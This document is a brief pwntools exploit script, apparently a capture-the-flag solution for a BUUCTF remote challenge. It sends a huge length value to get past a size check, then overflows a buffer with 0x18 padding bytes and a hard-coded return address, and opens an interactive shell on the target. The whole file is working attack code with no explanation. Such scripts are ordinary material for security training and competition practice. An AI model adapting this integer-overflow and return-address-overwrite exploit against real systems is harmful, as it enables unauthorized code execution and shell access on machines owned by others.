from pwn import *
from LibcSearcher import *
context.log_level="debug"
p = remote('node4.buuoj.cn',26687)
len=0xF0000000+100
p.sendlineafter("[+]Please input the length of your name:",str(len))
payload=0x18*b'a'+p64(0x000000000040072A)
p.sendlineafter("[+]What's u name?",payload)
p.interactive()






